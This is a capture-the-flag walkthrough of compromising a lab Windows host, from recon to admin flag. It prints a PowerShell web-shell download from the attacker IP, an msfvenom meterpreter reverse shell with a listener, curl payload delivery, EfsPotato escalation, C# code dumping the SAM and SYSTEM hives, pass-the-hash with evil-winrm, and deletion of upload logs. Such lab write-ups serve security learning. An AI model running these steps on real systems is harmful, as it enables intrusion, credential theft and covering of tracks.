# Steal - Workthrough

## Recon:
nmap -sCV -Pn 139,445,3389,5985,8443,8000,8080,47001,49668,49665,49667,49669,49664,49676,49666 -vvv -T4 10.65.183.23

nmap output:  
PORT     STATE SERVICE       REASON          VERSION  
139/tcp  open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn  
445/tcp  open  microsoft-ds? syn-ack ttl 126  
3389/tcp open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services  
|_ssl-date: 2026-01-30T02:51:45+00:00; 0s from scanner time.  
| rdp-ntlm-info:   
|   Target_Name: HOSTEVASION  
|   NetBIOS_Domain_Name: HOSTEVASION  
|   NetBIOS_Computer_Name: HOSTEVASION  
|   DNS_Domain_Name: HostEvasion  
|   DNS_Computer_Name: HostEvasion  
|   Product_Version: 10.0.17763  
|_  System_Time: 2026-01-30T02:51:05+00:00  
| ssl-cert: Subject: commonName=HostEvasion  
| Issuer: commonName=HostEvasion  
| Public Key type: rsa  
| Public Key bits: 2048  
| Signature Algorithm: sha256WithRSAEncryption  
| Not valid before: 2026-01-29T02:36:48  
| Not valid after:  2026-07-31T02:36:48  
| MD5:     be0c bad4 7915 9c52 7569 62c1 a510 f245  
| SHA-1:   5f22 7141 d8d7 6caa 19de f314 9f3d a00f 6ab4 4be9  
| SHA-256: 89f0 6268 57c7 b1d9 1ac7 ae27 8b6b 693c 26bc 5198 90d9 5b09 c0c9 869b 9e14 f5ca  
| -----BEGIN CERTIFICATE-----  
| MIIC2jCCAcKgAwIBAgIQNAzT0ucx3aBBh++kvxNXmTANBgkqhkiG9w0BAQsFADAW  
| MRQwEgYDVQQDEwtIb3N0RXZhc2lvbjAeFw0yNjAxMjkwMjM2NDhaFw0yNjA3MzEw  
| MjM2NDhaMBYxFDASBgNVBAMTC0hvc3RFdmFzaW9uMIIBIjANBgkqhkiG9w0BAQEF  
| AAOCAQ8AMIIBCgKCAQEAwfREMCl1DsMD8yCnWw2EJxb6x6Do5v3yRYUAhjcMQaYT  
| CciHE8OHZvDOZDzPyexRUXr5WPGY95p6VOmTlClLJb9i8Pcvlm3z+dhieVfxUkyv  
| cFpLwBaAbc7UEkaiCk5m+nKu2//nVNijTv7b0UyRBIfUu0ZbvbObfErQ+QsjBQ6U  
| LAjlQF5MO75W2ZHUsAktTLqBSHGtq6l+0E7nfWkIzKTnwIcXMqWJiIrm0yoNy7y1  
| lSTn7BS7OZLbIdXpjrZmSJycWkW3ceJhKlHFt1bvvehDHSq8DQ8+FsGvTI21bvDR  
| 90M7m7B+hHsb5H+7LnwgXPkXFjXlAO82Q91K/L9g6QIDAQABoyQwIjATBgNVHSUE  
| DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAB7t  
| 4sO685HjDmwxmQ6iuLd4GbixwaZ9cYWWuyJHm/Vf9qE1Tr70OSVj+fu9myAUIosq  
| 2n/htjAw4H/FOCC6YnVzlZhvFpgqUJd22YUPvKEuqK+c7xLErCC8L7NhD3x2bzqQ  
| cI6F905Gc9t8lwPhxOv4kGQ7cJ2Y/BONhT3hOlejG5IHO9YjYm89RQZVCpTlDr/6  
| r/YI+/mAxSFUdBwKFwtFosimkoLNHKDneZ4209a1kuxUWBf9LL5qg7dZN0QaPKBC  
| qOL4MW/rI1Vrt4Z044PGVnUqrUDmkW/qMhKrRYJpapHnDj8e5G3cWDvkxGZoJgB5  
| McbtJihq3i4clGF8u8k=  
|_-----END CERTIFICATE-----  
5985/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
8000/tcp open  http          syn-ack ttl 126 PHP cli server 5.5 or later  
| http-methods:   
|_  Supported Methods: GET HEAD POST OPTIONS  
|_http-title: 404 Not Found  
8080/tcp open  http          syn-ack ttl 126 Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)  
|_http-open-proxy: Proxy might be redirecting requests  
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28  
|_http-title: PowerShell Script Analyser  
| http-methods:   
|_  Supported Methods: GET HEAD POST OPTIONS  
8443/tcp open  ssl/http      syn-ack ttl 126 Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)  
| http-methods:   
|_  Supported Methods: GET HEAD POST OPTIONS  
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28  
| ssl-cert: Subject: commonName=localhost  
| Issuer: commonName=localhost  
| Public Key type: rsa  
| Public Key bits: 1024  
| Signature Algorithm: sha1WithRSAEncryption  
| Not valid before: 2009-11-10T23:48:47  
| Not valid after:  2019-11-08T23:48:47  
| MD5:     a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0  
| SHA-1:   b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6  
| SHA-256: 0169 7338 0c0f 1df0 0bd9 593e d8d5 efa3 706c d6df 7993 f614 1272 b805 22ac dd23  
| -----BEGIN CERTIFICATE-----  
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls  
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD  
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj  
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o  
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT  
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD  
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd  
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL  
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=  
|_-----END CERTIFICATE-----  
|_http-title: PowerShell Script Analyser  
|_ssl-date: TLS randomness does not represent time  
| tls-alpn:   
|_  http/1.1  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows  

Host script results:  
| smb2-security-mode:   
|   3.1.1:   
|_    Message signing enabled but not required  
| p2p-conficker:   
|   Checking for Conficker.C or higher...  
|   Check 1 (port 38414/tcp): CLEAN (Timeout)  
|   Check 2 (port 15865/tcp): CLEAN (Timeout)  
|   Check 3 (port 62285/udp): CLEAN (Timeout)  
|   Check 4 (port 37749/udp): CLEAN (Timeout)  
|_  0/4 checks are positive: Host is CLEAN or ports are blocked  
| smb2-time:   
|   date: 2026-01-30T02:51:05  
|_  start_date: N/A  
|_clock-skew: mean: 0s, deviation: 0s, median: 0s  

=> We see a lot of ports opening but we will focus on port 8080. Now vist http://target:8080. 

Since this is a window server, we will upload a powershell file that will execute and download web shell (https://github.com/flozz/p0wny-shell/blob/master/shell.php) for us.

Create a powershell script that will download the shell  
#Specify the URL to download the file from YOUR_IP = tun0 attacker IP  
$url = "http://YOUR_IP/shell.php"  
#Specify the local path to save the downloaded file  
$localPath = "C:\xampp\htdocs\shell.php"  
#Download the file and save it locally  
Invoke-WebRequest -Uri $url -OutFile $localPath

Before we deliver it, start the server # python -m http.server 80

Then upload the script at http://target:8080 and check at server 

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.65.183.23 - - [29/Jan/2026 22:21:16] "GET /shell.php HTTP/1.1" 200 -

Then we can go back to http://targetip:8080/shell.php => We have a local account access

## Weaponization
We craft the payload using msfvenom:  
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f exe -o rev.exe -e x64/zutto_dekiru

We start msfconsole listener:  
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost YOUR_IP; set lport YOUR_PORT; exploit"

## Delivery
When we are done with setup, we use web shell to deliver the payload and excute the shell

In http://target:8080/shell.php we type:  
curl http://192.168.163.235:80/rev.exe -o rev.exe

% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
                                 Dload  Upload   Total   Spent    Left  Speed  

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  
100  7680  100  7680    0     0   7680      0  0:00:01 --:--:--  0:00:01  159k  

Then evader@HostEvasion:C:\xampp\htdocs# .\rev.exe

We should receive the connection in msfconsole
[*] Using configured payload generic/shell_reverse_tcp  
payload => windows/x64/meterpreter/reverse_tcp  
lhost => YOUR_IP  
lport => 1234  
[*] Started reverse TCP handler on YOUR_IP:1234   
[*] Sending stage (232006 bytes) to 10.65.183.23  
[*] Meterpreter session 1 opened (YOUR_IP:1234 -> 10.65.183.23:49921) at 2026-01-29 22:47:54 -0500  

meterpreter > getuid  
Server username: HOSTEVASION\evader  
meterpreter >  

We do getuid to check it is evader and check what privileges you have by execute getprivs  
meterpreter > getprivs  
SeChangeNotifyPrivilege  
SeCreateGlobalPrivilege  
SeImpersonatePrivilege  
SeIncreaseWorkingSetPrivilege  

We interested in SeImpersonatePrivilege

## Exploitation (Automatic) <Chose 1>
Execute getsystem  
meterpreter > getsystem  
[-] priv_elevate_getsystem: Operation failed: All pipe instances are busy. The following was attempted:  
[-] Named Pipe Impersonation (In Memory/Admin)  
[-] Named Pipe Impersonation (Dropper/Admin)  
[-] Token Duplication (In Memory/Admin)  
[-] Named Pipe Impersonation (RPCSS variant)  
[-] Named Pipe Impersonation (PrintSpooler variant)  
[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)  

We got nothing since this got patched  
meterpreter > getuid  
Server username: HOSTEVASION\evader  

## Exploitation (Mannually) <Chose 2>
In web shell we type evader@HostEvasion:C:\xampp\htdocs# dir C:\Windows\Microsoft.Net\Framework\

There is a .NET SDK compiler v4.0.30319

Execute whoami /priv to check you have SeImpersonatePrivilege enabled or not

Then we do another exploit code (https://github.com/zcgonvh/EfsPotato/blob/master/EfsPotato.cs) locally on the system, and also another C# file that execute the registry query to dump SAM/SYSTEM hive

Create another program like backup.cs with using the code below:

using System;  
using System.Diagnostics;  

class Program  
{  
    static void Main()  
    {  
        ExecuteCommand("reg.exe", "save HKLM\\SYSTEM C:\\xampp\\htdocs\\system.bak");  
        ExecuteCommand("reg.exe", "save HKLM\\SAM C:\\xampp\\htdocs\\sam.bak");    
        Console.WriteLine("Backup completed successfully.");  
    }
    static void ExecuteCommand(string command, string arguments)  
    {  
        Process process = new Process();  
        process.StartInfo.FileName = command;  
        process.StartInfo.Arguments = arguments;  
        process.StartInfo.UseShellExecute = false;  
        process.StartInfo.RedirectStandardOutput = true;  
        process.StartInfo.CreateNoWindow = true;  
        process.Start();  
        string output = process.StandardOutput.ReadToEnd();  
        process.WaitForExit();  
        if (process.ExitCode != 0)  
        {  
            Console.WriteLine("Error: " + output);  
        }  
    }  
}  

Compile this cmd   
For exploit.cs  
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe exploit.cs -nowarn:1691,618  
For backup.cs  
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe backup.cs  

Execute this .\exploit.exe backup.exe  

Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).  
Part of GMH's fuck Tools, Code By zcgonvh.  
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]  

[+] Current user: HOSTEVASION\evader  
[+] Pipe: \pipe\lsarpc  
[!] binding ok (handle=1498430)  
[+] Get Token: 800  
[!] process with pid: 5888 created.  
Backup completed successfully.  

Then check dir *.bak and then download them to your kali


wget http://TARGET_IP:8080/system.bak  
wget http://TARGET_IP:8080/sam.bak  

Then we dump the hashes

impacket-secretsdump -sam sam.bak -system system.bak local

What we interest the most is 
Administrator:500:aad3b435b51....b51404ee:2dfe337833....b856a662a:::

Then we use Evil-Winrm to access the box as Admin via pass the hash technique

evil-winrm -u Administrator -H ADMIN_HASH -i TARGET_IP


Time to get User Flag => usually in desktop C:\Users\evader\Desktop> dir  
8/3/2023   7:12 PM            194 encodedflag

C:\Users\evader\Desktop> type encodedflag

## User flag 
Download the flag on your own computer and use the following command  
cat encodedflag | head -n -1|tail -n +2|base64 -d
You can get the flag by visiting the link http://<IP_OF_THIS_PC>:8000/asdasdadasdjakjdnsdfsdfs.php

When visiting that site, it said   
Hey, seems like you have uploaded invalid file. Blue team has been alerted.  
Hint: Maybe removing the logs files for file uploads can help?  

=> We need to remove the log.txt file in C:\xampp\htdocs\uploads

And then reload the enpoint again, we get the user flag Flag: THM{1010_EVASION_LOCAL_USER} 

## Admin flag 
In evii-winrm, we move to C:\Users\Administrator\Desktop> then you see the flag THM{101011_ADMIN_ACCESS}